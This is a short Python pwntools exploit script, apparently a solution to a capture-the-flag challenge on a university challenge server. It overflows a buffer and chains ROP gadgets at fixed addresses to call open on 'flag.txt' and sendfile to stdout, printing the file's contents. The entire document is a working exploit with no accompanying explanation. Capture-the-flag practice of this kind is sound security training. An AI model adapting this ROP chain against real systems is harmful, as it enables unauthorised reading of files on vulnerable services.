from pwn import *

HOST = 'cyberchallenge.disi.unitn.it'
PORT = 50330
OFFSET = 72

r = remote(HOST, PORT)

flag = p64(0x404020)                        # "flag.txt" position 

pop_r10 = p64(0x000000000040119c)           # pop r10; ret;
pop_rdi = p64(0x0000000000401196)           # pop rdi; ret;
pop_rdx = p64(0x000000000040119a)           # pop rdx; ret;
pop_rsi = p64(0x0000000000401198)           # pop rsi; ret;

syscall_open = p64(0x000000000040119f)      # mov rax, 2; syscall;
syscall_sendfile = p64(0x00000000004011a9)  # mov rax, 0x28; syscall; nop; pop rbp; ret;

payload = b'A' * OFFSET

# open file --> syscall: open(path, 0, 0)
payload += pop_rdi + flag       # rdi a flag position
payload += pop_rsi + p64(0)     # rsi 0
payload += pop_rdx + p64(0)     # rdx 0

payload += syscall_open 

# sendfile  --> syscall sendfile(out_fd=1, in_fd=3, offset=0, count=100)
payload += pop_rdi + p64(1)     # out_fd = 1 (stdout)
payload += pop_rsi + p64(3)     # in_fd = 3 (file descriptor)
payload += pop_rdx + p64(0)     # offset = 0
payload += pop_r10 + p64(100)   # count = 100 (max byte)

payload += syscall_sendfile 
payload += p64(0)               # dummy value 4 rbp

r.sendline(payload)
print(r.recvall(timeout=1).decode(errors="ignore").split("\n")[0])